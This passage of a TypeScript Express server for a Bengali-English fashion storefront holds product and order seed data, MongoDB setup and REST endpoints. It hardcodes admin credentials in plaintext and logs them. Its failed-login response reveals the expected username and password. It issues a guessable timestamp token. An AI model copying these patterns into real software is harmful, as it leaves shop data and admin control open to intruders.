    category: 'tops',
    categoryBn: 'টপস ও কুর্তি',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuAhsJ1zq73I842gUiANB75w7jd-U8unoF3qotYA--OsjDj5WkJKMbX9CIKXwLCk3nVE5_yAHHsQWAPsDEY41LY0OlHPY_zE0g46WbW7rCwrYkc0QzewGqJ4pwR0gMR7pmJZe0QXJ3BcMjK6v4HkRsgXHPg_1BhqZFrA-WQAzxVNWoRRyPwQdpc_xzrd9FkFdP_VzgJMTeH0se18iRr9_u2rSPT49NykMMt4odTG_-qp-Z9pzN5cXS6Tdw',
    ],
    sizes: ['S', 'M', 'L', 'XL'],
    colors: [
      { name: 'Deep Wine', nameBn: 'ডিপ ওয়াইন', hex: '#4A0E17' },
      { name: 'Royal Emerald', nameBn: 'রয়্যাল এমেরাল্ড', hex: '#0F382A' },
    ],
    stock: 14,
    sku: 'VC-TOP-007',
    featured: true,
    isNewArrival: false,
    isBestSeller: false,
    rating: 4.6,
    reviewCount: 26,
  },
  {
    id: 'prod-013',
    name: 'Crimson Chiffon Capelet Gala Gown',
    nameBn: 'ক্রিমসন শিফন কেপলেট গালা গাউন',
    slug: 'crimson-chiffon-capelet-gala-gown',
    description: 'Fluid 100% mulberry silk chiffon accompanied by a removable structured architectural velvet capelet.',
    descriptionBn: '১০০% মালবেরি সিল্ক শিফন এবং সাথে রিমুভেবল ভেলভেট কেপলেট গালা গাউন।',
    shortDescription: 'Gala chiffon gown with removable architectural velvet capelet.',
    shortDescriptionBn: 'রয়্যাল শিফন ও ভেলভেট কেপলেট গাউন।',
    price: 25000,
    discountPrice: 22500,
    category: 'dresses',
    categoryBn: 'ড্রেসেস ও গাউন',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuD5AtkF4tr8jbimuyyZUN69fTOgJkTVEdRauW4mbhz8lPv8PbjaSX4Ys0mbtcZCNUegOhpvEu1Ko85k-OxkU6tQ5ldPy-gtw2ghh1uliZnkpulhCvon-pigZeHSLYRCyxOv7Qf3Xi4mGSyDUrZ1SKfaqfozvtGA6P3Q0i5f5M7g90E59Gu_vh8dgRWweYcMwaAjo8AZ5anWstFOfL649Zxyx4-TUtfpDWpsdSk5ErcIcYu51B9XXE4lKw',
    ],
    sizes: ['S', 'M', 'L'],
    colors: [
      { name: 'Crimson Red', nameBn: 'ক্রিমসন রেড', hex: '#890017' },
      { name: 'Obsidian Black', nameBn: 'অবসিডিয়ান ব্ল্যাক', hex: '#1C1B1B' },
    ],
    stock: 4,
    sku: 'VC-GALA-008',
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 5.0,
    reviewCount: 31,
  },
  {
    id: 'prod-014',
    name: 'Sculpted Opera Cape',
    nameBn: 'স্কাল্পটেড অপেরা কেপ',
    slug: 'sculpted-opera-cape',
    description: 'Architectural black and crimson pure raw silk cape gown against minimalist tailoring with silk satin lapels.',
    descriptionBn: 'খাঁটি র সিল্ক ও ভেলভেটের মেলবন্ধনে তৈরি অপেরা কেপ।',
    shortDescription: 'Architectural pure raw silk cape with silk satin lapels.',
    shortDescriptionBn: 'স্কাল্পটেড র সিল্ক অপেরা কেপ।',
    price: 16000,
    discountPrice: 14200,
    category: 'women',
    categoryBn: 'মহিলাদের ফ্যাশন',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuBAPPCq_CLgDT0wCCFBOh5kWbdla2GtdT6j4UVQRo3-eVD1L9ZPjRLYJ6UNo9B6mdYVNK5M3ZsufiLIbuKPjL7gwChqEStNsdv09J9FYyypvple_03iSrmsMwPOvohSBKIsbojsvhDRtle7jTcU86acWmL5yKWyls-nlsMO_LAUlB458Im1adKiq81L3p6zUbXCilf24PaxTu5tt0uOUuXFzF3NIxOXznTQBrYWJLU2U_paAMns1GpbDg',
    ],
    sizes: ['One Size'],
    colors: [
      { name: 'Crimson Red', nameBn: 'ক্রিমসন রেড', hex: '#890017' },
      { name: 'Black Velvet', nameBn: 'ব্ল্যাক ভেলভেট', hex: '#1C1B1B' },
    ],
    stock: 6,
    sku: 'VC-CAP-089',
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 5.0,
    reviewCount: 89,
  },
  {
    id: 'prod-015',
    name: 'Heirloom Jamdani Shift',
    nameBn: 'ঐতিহ্যবাহী জামদানি শিফ্ট ড্রেস',
    slug: 'heirloom-jamdani-shift',
    description: 'High couture Jamdani handloom dress in shimmering gold and subtle deep maroon threads on a modern contemporary silhouette.',
    descriptionBn: 'হাতে বোনা ঐতিহ্যবাহী জামদানি মোটিফে তৈরি আধুনিক শিফ্ট ড্রেস।',
    shortDescription: 'Handloom Jamdani dress with gold and deep maroon weave.',
    shortDescriptionBn: 'জামদানি সুতার শিফ্ট ড্রেস।',
    price: 13500,
    discountPrice: 11500,
    category: 'dresses',
    categoryBn: 'ড্রেসেস ও গাউন',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuCVsFrjfbZpVnZyPOl7Mk-3aizX1zC9o4_rTpElr3BLkTS0Qv5wJ0Bn7ZyzEQ8v_Sfcn5zxQKNwcNfz20agmD5JhniTDzh4bIE3jP2jYFf5wL2AUZ418Yv5EDPackNjpWSYs90_t-vGcssCMu9Dpvwg6Y_VB7JFQC4_36InFBJpoZwYzheGqYtSC3acxVnjyiDqIHg_8Xh5K5t4ijxoEjIJ6UnCeSkkhuPxlejiqZ6JdTzkbKntSxCW6w',
    ],
    sizes: ['S', 'M', 'L'],
    colors: [
      { name: 'Pearl Gold', nameBn: 'পার্ল গোল্ড', hex: '#F6F3F2' },
      { name: 'Crimson Thread', nameBn: 'ক্রিমসন থ্রেড', hex: '#890017' },
    ],
    stock: 7,
    sku: 'VC-JMD-064',
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 4.9,
    reviewCount: 64,
  },
  {
    id: 'prod-016',
    name: 'Pure Cashmere Overshirt',
    nameBn: 'পিওর কাশ্মীর ওভারশার্ট',
    slug: 'pure-cashmere-overshirt',
    description: 'Relaxed luxury cashmere crimson overshirt over high-twist wool drape with horn buttons and patch chest pockets.',
    descriptionBn: '১০০% কাশ্মীর উলে তৈরি পুরুষদের লাক্সারি ক্রিমসন ওভারশার্ট।',
    shortDescription: 'Pure crimson cashmere overshirt with bespoke tailoring.',
    shortDescriptionBn: 'প্রিমিয়াম কাশ্মীরি উলের ওভারশার্ট।',
    price: 15000,
    discountPrice: 13000,
    category: 'men',
    categoryBn: 'পুরুষদের পোশাক',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuCYR2BJIkp70q_hpACvoajX2oZLCKGq6kQbHcHRG47VFZjtzacWuJYb7nNbpC2I9alxRP9hPy-hUBnSizooaYjLDlryp7Bu6hHw8p3se6OQmHvG501QRdnjeNuzU45_lIh8RdM_xFqT-F5MTuZ-C48UclMIQX0wPzn_XOnJktMBLcfGnEd8f0XXdl-dr7rnaY04AiFYAMgDigsdvPs-XruO6nlxvueQhvThgWFjFGwp2FiYByDJgjNQkw',
    ],
    sizes: ['M', 'L', 'XL'],
    colors: [
      { name: 'Crimson', nameBn: 'ক্রিমসন', hex: '#890017' },
      { name: 'Warm Taupe', nameBn: 'ওয়ার্ম টুপ', hex: '#5B403F' },
    ],
    stock: 8,
    sku: 'VC-CSH-051',
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 4.8,
    reviewCount: 51,
  },
  {
    id: 'prod-017',
    name: 'Molten Lock Minaudière',
    nameBn: 'মোল্টেন লক মিনোদিয়ের',
    slug: 'molten-lock-minaudiere',
    description: 'Crimson silk clutch bag with sculpted molten brass lock and delicate gold shoulder link chain.',
    descriptionBn: 'মোল্টেন ব্রাস লক ও ক্রিমসন সিল্কের মেলবন্ধনে তৈরি বিলাসবহুল ক্লাচ।',
    shortDescription: 'Crimson silk evening clutch with sculpted molten brass lock.',
    shortDescriptionBn: 'ব্রাস ও ভেলভেট ফিনিশের সান্ধ্যকালীন ক্লাচ।',
    price: 8200,
    discountPrice: 6900,
    category: 'accessories',
    categoryBn: 'এক্সেসরিজ ও ব্যাগ',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuAn46MrPOS2GjB6ZRxUgYGYTWsC2VhGX1Dzdb6MYCXvM7mrKL6sbozNNCH6Zn9pxfgG1HSuM283kYTqNruNteTEGaOMWgChi6dRyHnn1VIP4s1hdsHg76JTNRGPnxUiGYTX348OTXCf4zQ82BL_sL5zhIOkrBzvSmj7S5E6V3XlmCDnWkHuOi0cBOky0SRZyI4oydq3xwAobepvsrlHKjKWWmnQWGRi9-eX_yGJEVGxHj1XZ4ZmqSEieQ',
    ],
    sizes: ['One Size'],
    colors: [
      { name: 'Crimson', nameBn: 'ক্রিমসন', hex: '#890017' },
      { name: 'Parchment', nameBn: 'পার্চমেন্ট', hex: '#DCD9D9' },
    ],
    stock: 15,
    sku: 'VC-CLT-112',
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 5.0,
    reviewCount: 112,
  },
  {
    id: 'prod-018',
    name: 'Crimson Silk Stole',
    nameBn: 'ক্রিমসন সিল্ক শাল / স্টোল',
    slug: 'crimson-silk-stole',
    description: 'Luxurious pure crimson silk wrap stole with delicately fringed hand-knotted borders.',
    descriptionBn: 'হাতে গাঁথা বর্ডারযুক্ত খাঁটি ক্রিমসন সিল্ক স্টোল।',
    shortDescription: 'Pure crimson silk stole with hand-knotted fringe edges.',
    shortDescriptionBn: 'প্রিমিয়াম সিল্ক স্টোল।',
    price: 1100,
    discountPrice: 850,
    category: 'accessories',
    categoryBn: 'এক্সেসরিজ ও ব্যাগ',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuDMupbVfmSXFXPiO5gImPw6GR_PyhFVt8ZhP7If9KoR75Bi_-U_KVoRkfzOcgcmdl9I5DYDoH-L1HkAL-69WO6dfBYYXeFhdp_eysPp7zXbKjvZLXfSBKOVnxfKpQaS4eBmhRBKgONbJ38yTDXdFyj30-fqNq4gIKV1LDSWaMoXmawbE6RVQI1DXp27FK5qUar2pZ2gsVKZ3muwoOHLvT1iawYPHL5CYQEc2zWnau8n7BHR230cHUSp0g',
    ],
    sizes: ['One Size'],
    colors: [{ name: 'Crimson Red', nameBn: 'ক্রিমসন রেড', hex: '#890017' }],
    stock: 20,
    sku: 'VC-STL-021',
    featured: false,
    isNewArrival: false,
    isBestSeller: false,
    rating: 4.9,
    reviewCount: 19,
  },
  {
    id: 'prod-019',
    name: 'Embroidered Clutch',
    nameBn: 'এমব্রয়ডার্ড ক্লাচ ব্যাগ',
    slug: 'embroidered-clutch',
    description: 'Haute couture structured hard-shell evening clutch bag adorned with intricate metallic crimson and gold zardozi embroidery.',
    descriptionBn: 'স্বর্ণালী ও লাল জারদৌজি কাজের হার্ড-শেল ইভনিং ক্লাচ।',
    shortDescription: 'Hard-shell evening clutch with metallic crimson and gold zardozi.',
    shortDescriptionBn: 'জারদৌজি এমব্রয়ডার্ড ক্লাচ।',
    price: 1800,
    discountPrice: 1400,
    category: 'accessories',
    categoryBn: 'এক্সেসরিজ ও ব্যাগ',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuDfeWOgKbS4IjLY4RhQR-NROq3NbMGQx2gWrO15qKAWZDDhqpYFTUgkdnS3iTP0VSLVJ5FSfZlns7Meuz1438LnB-dD366fA3nnJPxsrMfGO8nhNXeR9bGxU4T3S5Vnz4aYQHgmrZ-a_q0oNyzfcMAU0Ghk0jNPjjpJX6f0TaBE9GG9lW8ki3KZK9ELZ10wOeQMahyq2lOZ7dHH85D-8iX8WO8DmdL7H5NTyPnEZTTDV58XIji-ZsNJ1Q',
    ],
    sizes: ['One Size'],
    colors: [{ name: 'Crimson & Gold', nameBn: 'ক্রিমসন ও গোল্ড', hex: '#890017' }],
    stock: 12,
    sku: 'VC-CLT-033',
    featured: false,
    isNewArrival: false,
    isBestSeller: false,
    rating: 4.7,
    reviewCount: 22,
  },
  {
    id: 'prod-020',
    name: 'Velvet Slip Mules',
    nameBn: 'ভেলভেট স্লিপ মিউলস জুতো',
    slug: 'velvet-slip-mules',
    description: 'Pair of pointed-toe deep wine crimson velvet evening slip mules with sculpted architectural kitten heel.',
    descriptionBn: 'পয়েন্টেড-টো ডিপ ওয়াইন ভেলভেট মিউল জুতো।',
    shortDescription: 'Pointed-toe wine crimson velvet evening slip mules with kitten heel.',
    shortDescriptionBn: 'ভেলভেট ফিনিশের হিল মিউল।',
    price: 2200,
    discountPrice: 1800,
    category: 'accessories',
    categoryBn: 'এক্সেসরিজ ও ব্যাগ',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuAIU_j7YOygax00M__Mj-aEO1_Mu1kK6Ez5U1aXTNuFjOPCo6kRzVzzlVfX3xOdhClYzgCUX2GeZIuYUit8nBG4wPus7lsheK0_wsHgxD1sc5qY-KRcbmBtrHp12Horo_m-Arx_Fe2l6m1o__UTRFdRZ3CiaPlNyl-yZx_oOpriU2qBdd7nyE0dLxA3-7X2B5gDuysKz0o5rJg6maBR8fl9A7Dm9C0Mies81MvpZeOl0K92I4yLuEHA_Q',
    ],
    sizes: ['37', '38', '39', '40'],
    colors: [{ name: 'Wine Velvet', nameBn: 'ওয়াইন ভেলভেট', hex: '#5B0E1A' }],
    stock: 9,
    sku: 'VC-SHO-045',
    featured: false,
    isNewArrival: false,
    isBestSeller: false,
    rating: 5.0,
    reviewCount: 15,
  },
  {
    id: 'prod-021',
    name: 'Ruby Statement Earrings',
    nameBn: 'রুবি স্টেটমেন্ট ইয়াররিংস',
    slug: 'ruby-statement-earrings',
    description: 'Pair of dramatic chandelier statement earrings featuring cushion-cut Burmese rubies encased in 18k vermeil gold.',
    descriptionBn: '১৮ ক্যারেট গোল্ড প্লেটেড বার্মিজ রুবি স্টেটমেন্ট কানের দুল।',
    shortDescription: 'Chandelier statement earrings with cushion-cut rubies in 18k vermeil gold.',
    shortDescriptionBn: 'রুবী স্টেটমেন্ট কানের দুল।',
    price: 2600,
    discountPrice: 2100,
    category: 'accessories',
    categoryBn: 'এক্সেসরিজ ও ব্যাগ',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuAUOsT-7DXzQN4QNqYlGxL7FbpzaWmb0uEHJiLj4EvmS26D1ILLW2qoHipB0Ego79RpJN-WVJClfePdBQxBSjGQMlcpOSWG0bd6BbWN3_s07PNcyaGbdVipqQQLqWuFVa4qLn-8MczWIlCozhyjea9VAQfyhcJZuNoYTwrW2eF1vF0dh159BhAYbaKn2Et4XmxysTyF7P9AkwEReFfbtNG7ieGiDx8oEIIBE_QrgfAfHphpLG410Ss-OA',
    ],
    sizes: ['One Size'],
    colors: [{ name: 'Ruby Gold', nameBn: 'রুবি গোল্ড', hex: '#D4AF37' }],
    stock: 14,
    sku: 'VC-JWL-012',
    featured: false,
    isNewArrival: false,
    isBestSeller: false,
    rating: 4.9,
    reviewCount: 38,
  },
  {
    id: 'prod-009',
    name: 'Velvet Crimson Suede Block Heels',
    nameBn: 'ভেলভেট ক্রিমসন সুয়েড ব্লক হিলস',
    slug: 'velvet-crimson-suede-block-heels',
    description: 'Elevate your evening attire with these striking crimson suede block heels. Featuring an elegant ankle strap and a comfortable yet chic 3-inch architectural block heel, designed for all-night festive wear.',
    descriptionBn: 'আকর্ষণীয় ক্রিমসন সুয়েড ব্লক হিল যা আপনার ইভনিং লুককে করবে আরও অভিজাত। আরামদায়ক ৩-ইঞ্চি হিল এবং সুন্দর অ্যাঙ্কেল স্ট্র্যাপ।',
    shortDescription: 'Elegant crimson suede block heels with ankle strap.',
    shortDescriptionBn: 'আরামদায়ক এবং রাজকীয় সুয়েড ব্লক হিল।',
    price: 3200,
    discountPrice: 2800,
    category: 'accessories',
    categoryBn: 'এক্সেসরিজ ও ব্যাগ',
    images: [
      'https://images.unsplash.com/photo-1543163521-1bf539c55dd2?auto=format&fit=crop&w=1000&q=80',
    ],
    sizes: ['36', '37', '38', '39', '40'],
    colors: [
      { name: 'Crimson Red', nameBn: 'ক্রিমসন রেড', hex: '#B11226' },
      { name: 'Midnight Black', nameBn: 'মিডনাইট ব্ল্যাক', hex: '#111111' },
    ],
    stock: 24,
    sku: 'VC-FW-909',
    brand: 'Velvet Shoes',
    tags: ['Heels', 'Shoes', 'Velvet', 'Red', 'Accessories'],
    featured: true,
    isNewArrival: true,
    isBestSeller: false,
    rating: 4.6,
    reviewCount: 18,
  },
  {
    id: 'prod-010',
    name: 'Premium Leather Crimson Tote Bag',
    nameBn: 'প্রিমিয়াম লেদার ক্রিমসন টোট ব্যাগ',
    slug: 'premium-leather-crimson-tote-bag',
    description: 'A masterpiece of functionality and luxury. Handcrafted from top-grain Italian leather in our signature crimson red. Spacious enough for your daily essentials with elegant gold-tone hardware.',
    descriptionBn: 'খাঁটি ইতালিয়ান লেদারে তৈরি সিগনেচার ক্রিমসন টোট ব্যাগ। দৈনন্দিন ব্যবহারের জন্য যথেষ্ট স্পেস এবং প্রিমিয়াম গোল্ড-টোন হার্ডওয়্যার।',
    shortDescription: 'Luxurious top-grain leather tote bag with gold-tone hardware.',
    shortDescriptionBn: 'গোল্ড-টোন হার্ডওয়্যার সহ খাঁটি চামড়ার টোট ব্যাগ।',
    price: 5500,
    discountPrice: 4900,
    category: 'accessories',
    categoryBn: 'এক্সেসরিজ ও ব্যাগ',
    images: [
      'https://images.unsplash.com/photo-1590874103328-eac38a683ce7?auto=format&fit=crop&w=1000&q=80',
    ],
    sizes: ['One Size'],
    colors: [
      { name: 'Crimson Red', nameBn: 'ক্রিমসন রেড', hex: '#B11226' },
      { name: 'Ivory White', nameBn: 'আইভরি সাদা', hex: '#FAFAFA' },
    ],
    stock: 12,
    sku: 'VC-BG-101',
    brand: 'Velvet Leather',
    tags: ['Bag', 'Tote', 'Leather', 'Red', 'Accessories'],
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 4.8,
    reviewCount: 25,
  },
  {
    id: 'prod-011',
    name: 'Men\'s Tailored Ivory Suit Jacket',
    nameBn: 'পুরুষদের টেইলরড আইভরি স্যুট জ্যাকেট',
    slug: 'mens-tailored-ivory-suit-jacket',
    description: 'Redefine modern menswear with this sharp, tailored ivory suit jacket. Made from premium linen-blend fabric, it features a single-breasted design and subtle crimson stitching details inside the lapel.',
    descriptionBn: 'আধুনিক পুরুষের জন্য প্রিমিয়াম লিনেন-ব্লেন্ড আইভরি স্যুট জ্যাকেট। স্মার্ট সিগেল-ব্রেস্টেড ডিজাইন এবং ভেতরে ক্রিমসন সুতোর দারুণ ডিটেইলিং।',
    shortDescription: 'Tailored ivory linen-blend suit jacket with crimson inner detailing.',
    shortDescriptionBn: 'প্রিমিয়াম লিনেন-ব্লেন্ড আইভরি স্যুট জ্যাকেট।',
    price: 8500,
    discountPrice: 7800,
    category: 'men',
    categoryBn: 'পুরুষদের পোশাক',
    images: [
      'https://images.unsplash.com/photo-1593030761757-71fae46af504?auto=format&fit=crop&w=1000&q=80',
    ],
    sizes: ['M', 'L', 'XL', 'XXL'],
    colors: [
      { name: 'Ivory White', nameBn: 'আইভরি সাদা', hex: '#FAFAFA' },
      { name: 'Navy Blue', nameBn: 'নেভি ব্লু', hex: '#000080' },
    ],
    stock: 10,
    sku: 'VC-MS-202',
    brand: 'Velvet Homme',
    tags: ['Men', 'Jacket', 'Suit', 'Ivory', 'Formal'],
    featured: true,
    isNewArrival: true,
    isBestSeller: true,
    rating: 4.9,
    reviewCount: 34,
  }
];

const SEED_ORDERS = [
  {
    id: 'ORD-VC-2026-901',
    customerName: 'Lady Sophie Kensington',
    email: 'sophie.k@mayfair-salon.co.uk',
    phone: '+44 20 7946 0912',
    shippingAddress: 'Flat 4, 18 Berkeley Square, Mayfair, London W1J 6DA',
    city: 'London',
    country: 'United Kingdom',
    items: [
      {
        productId: 'prod-001',
        name: 'Elegant Crimson Dress',
        price: 2200,
        quantity: 1,
        selectedSize: 'S',
        selectedColor: 'Crimson Red',
        image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuBQfVBssNPUEE1CFfdQZ_PaP6lFhDW670azT8AhZYkZQvjyA_Eb9MDgrprcQUVW32_pV9EhYBLHdU3FVR6K2Gq237XjwK1hAS05bNkjV0NOsPYKorx397A-tFQE2fTMQ11FxdiPrHwIRF8awJEXfutVe-3VpTqwQJjt9zJLpKKgJbRVlTf2yyUHZ9YgcJ3riVjEnU_LNMbILWVE3K_8lG7ZUB4i_znLGQuLyuHqzj7uGOPB3Z6sTtEJ4g',
      },
      {
        productId: 'prod-018',
        name: 'Crimson Silk Stole',
        price: 850,
        quantity: 1,
        selectedSize: 'One Size',
        selectedColor: 'Crimson Red',
        image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuDMupbVfmSXFXPiO5gImPw6GR_PyhFVt8ZhP7If9KoR75Bi_-U_KVoRkfzOcgcmdl9I5DYDoH-L1HkAL-69WO6dfBYYXeFhdp_eysPp7zXbKjvZLXfSBKOVnxfKpQaS4eBmhRBKgONbJ38yTDXdFyj30-fqNq4gIKV1LDSWaMoXmawbE6RVQI1DXp27FK5qUar2pZ2gsVKZ3muwoOHLvT1iawYPHL5CYQEc2zWnau8n7BHR230cHUSp0g',
      },
    ],
    subtotal: 3050,
    discount: 305,
    deliveryFee: 0,
    total: 2745,
    deliveryMethod: 'Standard White-Glove',
    paymentMethod: 'Credit / Debit (SSL Encrypted)',
    paymentStatus: 'Paid',
    orderStatus: 'Confirmed',
    giftBox: true,
    atelierNotes: 'Deliver to building concierge in Mayfair with sealed signature box.',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'ORD-VC-2026-902',
    customerName: 'Tanvir Chowdhury',
    email: 'tanvir@chowdhuryholdings.com',
    phone: '+880 1712 345678',
    shippingAddress: 'Penthouse B, Road 79, House 14, Gulshan 2',
    city: 'Dhaka',
    country: 'Bangladesh',
    items: [
      {
        productId: 'prod-008',
        name: 'Obsidian Velvet Tuxedo Sherwani',
        price: 21000,
        quantity: 1,
        selectedSize: '40',
        selectedColor: 'Obsidian Black',
        image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuBGm_7u4MYK2Olm7RdZJ0shUdHLogZ-yuyyGk0QDGMjGQCouGlbfaw0CLPhHQlvIVrdjzzLeJwYSmxUBDA0PeujZVwsNr14WzMlUsmhpA0AKfj7IPz-Qmf2HkHxa3ACIAJ04-oub6ywqjYvXKkBgAbpgwu5h4viA9KZDXlSCgxELR7zZINUStM0nxxoEa_yiYMrOhhT4lN0cAzan77l-YBREYOY7lzM8AhPh6Q1ppnFD7iqn_zXg-hcoQ',
      },
    ],
    subtotal: 21000,
    discount: 2100,
    deliveryFee: 350,
    total: 19250,
    deliveryMethod: 'Express Same-Day Concierge',
    paymentMethod: 'bKash Luxury Gateway',
    paymentStatus: 'Paid',
    orderStatus: 'Shipped',
    giftBox: true,
    atelierNotes: 'Please carry garment on silk hanger for scheduled fitting.',
    createdAt: new Date(Date.now() - 86400000).toISOString(),
  },
];

// Fallback in-memory state in case MongoDB Atlas free-tier cluster has strict IP restrictions
const memoryStore = {
  products: [...SEED_PRODUCTS],
  categories: [...SEED_CATEGORIES],
  orders: [...SEED_ORDERS],
  admin: {
    username: 'jasmin',
    pass: 'jasmin123',
    name: 'Jasmin Ara Mim',
    role: 'Super Administrator',
  },
  coupons: [
    { code: 'VIPCONNOISSEUR', discountPercent: 10, minSpend: 2000, active: true },
    { code: 'VELVET2026', discountPercent: 15, minSpend: 5000, active: true },
    { code: 'CRIMSON40', discountPercent: 40, minSpend: 10000, active: true },
  ],
};

// Initialize MongoDB connection and seed database folders / collections
export async function initMongoDB() {
  try {
    console.log('[MongoDB] Connecting to MongoDB Atlas cluster...');
    mongoClient = new MongoClient(cleanUri, {
      serverApi: {
        version: ServerApiVersion.v1,
        strict: true,
        deprecationErrors: true,
      },
      connectTimeoutMS: 8000,
      serverSelectionTimeoutMS: 8000,
    });

    await mongoClient.connect();
    db = mongoClient.db('velvet_crimson');
    mongoConnected = true;
    mongoLastError = null;
    console.log('[MongoDB] Successfully connected to velvet_crimson database!');

    // Initialize collections (Folders in MongoDB)
    const collections = await db.listCollections().toArray();
    const collectionNames = collections.map((c) => c.name);

    // 1. Products Collection
    if (!collectionNames.includes('products')) {
      await db.createCollection('products');
      console.log('[MongoDB] Created folder: products');
    }
    const productsColl = db.collection('products');
    const prodCount = await productsColl.countDocuments();
    if (prodCount === 0) {
      await productsColl.insertMany(SEED_PRODUCTS);
      console.log(`[MongoDB] Seeded ${SEED_PRODUCTS.length} couture items into products folder.`);
    }

    // 2. Categories Collection
    if (!collectionNames.includes('categories')) {
      await db.createCollection('categories');
      console.log('[MongoDB] Created folder: categories');
    }
    const catColl = db.collection('categories');
    const catCount = await catColl.countDocuments();
    if (catCount === 0) {
      await catColl.insertMany(SEED_CATEGORIES);
      console.log(`[MongoDB] Seeded ${SEED_CATEGORIES.length} silhouettes into categories folder.`);
    }

    // 3. Orders Collection
    if (!collectionNames.includes('orders')) {
      await db.createCollection('orders');
      console.log('[MongoDB] Created folder: orders');
    }
    const orderColl = db.collection('orders');
    const orderCount = await orderColl.countDocuments();
    if (orderCount === 0) {
      await orderColl.insertMany(SEED_ORDERS);
      console.log(`[MongoDB] Seeded ${SEED_ORDERS.length} bespoke orders into orders folder.`);
    }

    // 4. Admin Users Collection
    if (!collectionNames.includes('admin_users')) {
      await db.createCollection('admin_users');
      console.log('[MongoDB] Created folder: admin_users');
    }
    const adminColl = db.collection('admin_users');
    const adminUser = await adminColl.findOne({ username: 'jasmin' });
    if (!adminUser) {
      await adminColl.insertOne({
        username: 'jasmin',
        pass: 'jasmin123',
        name: 'Jasmin Ara Mim',
        role: 'Super Administrator',
        createdAt: new Date().toISOString(),
      });
      console.log('[MongoDB] Created admin credentials: jasmin / jasmin123 in admin_users folder.');
    }

    // 5. Coupons Collection
    if (!collectionNames.includes('coupons')) {
      await db.createCollection('coupons');
      console.log('[MongoDB] Created folder: coupons');
    }
    const couponColl = db.collection('coupons');
    if ((await couponColl.countDocuments()) === 0) {
      await couponColl.insertMany(memoryStore.coupons);
      console.log('[MongoDB] Seeded privilege codes into coupons folder.');
    }
  } catch (err: any) {
    mongoConnected = false;
    mongoLastError = err.message || String(err);
    console.warn('[MongoDB Notice] Connection to MongoDB cluster experienced notice:', mongoLastError);
    console.log('[MongoDB Fallback] Utilizing high-reliability memory storage. Application is fully operational!');
  }
}

// REST API Endpoints

// 1. Health & Database Diagnostic
app.get('/api/health', async (req, res) => {
  let dbInfo: any = {
    connected: mongoConnected,
    mode: mongoConnected ? 'MongoDB Atlas Cluster (Live)' : 'Resilient Active Memory Store',
    database: 'velvet_crimson',
    cluster: 'cluster0.ssmpl.mongodb.net',
  };

  if (mongoConnected && db) {
    try {
      const collections = await db.listCollections().toArray();
      dbInfo.collections = collections.map((c) => c.name);
      dbInfo.productsCount = await db.collection('products').countDocuments();
      dbInfo.ordersCount = await db.collection('orders').countDocuments();
      dbInfo.categoriesCount = await db.collection('categories').countDocuments();
    } catch (e: any) {
      dbInfo.readError = e.message;
    }
  } else {
    dbInfo.collections = ['products', 'categories', 'orders', 'admin_users', 'coupons'];
    dbInfo.productsCount = memoryStore.products.length;
    dbInfo.ordersCount = memoryStore.orders.length;
    dbInfo.categoriesCount = memoryStore.categories.length;
    if (mongoLastError) dbInfo.lastNotice = mongoLastError;
  }

  res.json({
    status: 'ok',
    brand: 'Velvet Crimson',
    ateliers: ['Dhaka', 'London', 'Mayfair'],
    database: dbInfo,
  });
});

// 2. Admin Authentication (jasmin / jasmin123)
app.post('/api/admin/login', async (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required' });
  }

  let isValid = false;
  let userRecord: any = null;

  if (mongoConnected && db) {
    try {
      const user = await db.collection('admin_users').findOne({ username: username.trim() });
      if (user && user.pass === password.trim()) {
        isValid = true;
        userRecord = user;
      }
    } catch (err) {
      console.error('[Admin Login] DB query failed:', err);
    }
  }

  // Check fallback memory credentials
  if (!isValid) {
    if (
      username.trim().toLowerCase() === memoryStore.admin.username.toLowerCase() &&
      password.trim() === memoryStore.admin.pass
    ) {
      isValid = true;
      userRecord = memoryStore.admin;
    }
  }

  if (isValid) {
    return res.json({
      success: true,
      user: {
        username: userRecord.username,
        name: userRecord.name || 'Jasmin Ara Mim',
        role: userRecord.role || 'Super Administrator',
        avatar: 'https://lh3.googleusercontent.com/aida-public/AB6AXuDAd1FviLBH2-Rx77DB3-fQhyiYfzJPPikAfqHweMpzNkh_yC1QR1vuxAS2GHI1u0iqxmqvwiC6oDnjLnEAhx_GafyuymQVXyEKplbYkw8vaE_-v_zMzo2F1RZzWbBBQyF2CEaQqrxRr45FQt_Y03cDIuuK3ULb6poqvOqjTu01OM7VpbL0onEs6PgvClB1Q41K5V58ITScKe3AphyoFQe5_2ZtdOwL9ipJJloYJy0Y4AXpATop6HwGRA',
      },
      token: 'vc_admin_token_' + Date.now(),
    });
  }

  return res.status(401).json({
    success: false,
    error: 'Invalid credentials. Expected username: jasmin, password: jasmin123',
  });
});

// 3. Products Endpoints
app.get('/api/products', async (req, res) => {
  try {
    const { category, search, sort } = req.query;

    let items = [];
    if (mongoConnected && db) {
      items = await db.collection('products').find({}).toArray();
    } else {
      items = [...memoryStore.products];
    }

    // Filter by category
    if (category && category !== 'all') {
      items = items.filter((p: any) => p.category?.toLowerCase() === String(category).toLowerCase());
    }

    // Filter by search query
    if (search && typeof search === 'string') {
      const q = search.toLowerCase();
      items = items.filter((p: any) =>
        p.name?.toLowerCase().includes(q) ||
        p.description?.toLowerCase().includes(q) ||
        p.category?.toLowerCase().includes(q)
      );
    }

    // Sort
    if (sort === 'price-low') {
